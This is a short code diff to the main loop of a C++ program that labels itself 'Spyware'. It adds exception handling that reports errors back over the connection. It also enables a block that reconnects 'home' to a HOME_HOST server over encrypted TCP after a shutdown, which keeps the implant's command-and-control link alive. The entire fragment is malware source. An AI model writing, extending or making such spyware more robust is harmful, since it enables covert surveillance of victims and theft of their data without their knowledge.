@@ -41,14 +41,26 @@ int main() {
     bool cont = true;
     while (cont)
     {
-        loopIter(conn, hiderManeger, admin);
+        try {
+            loopIter(conn, hiderManeger, admin);
+        } catch (const std::exception& e) {
+            // Handle the exception
+            std::cerr << "Spyware: Global Exception caught: " << e.what() << std::endl;
+            const std::string err(e.what());
+            conn->sendResponce(ERROR_FROM_UNKNOWN_SOURCE, err);
+        }
         std::cerr << "spyware: compleated loop iter\n";
-        // if (conn->checkShutdown()) {
-        //     if (EncSocketConnection::connectTCP(HOME_HOST, PORT, conn) != SUCCSESS) {
-        //         std::cerr << "Spyware: Connection home failed after shutdown\n";
-        //         exit(EXIT_FAILURE);
-        //     }
-        // }
+        try {
+            if (conn->checkShutdown()) {
+                if (EncSocketConnection::connectEncTCP(HOME_HOST, PORT, conn) != SUCCSESS) {
+                    std::cerr << "Spyware: Connection home failed after shutdown\n";
+                    exit(EXIT_FAILURE);
+                }
+            }
+        } catch (const std::exception& e) {
+            std::cerr << "Spyware: checking for shutdown failed, exiting\n";
+            exit(EXIT_FAILURE);
+        }
     }
 
     return EXIT_SUCCESS;
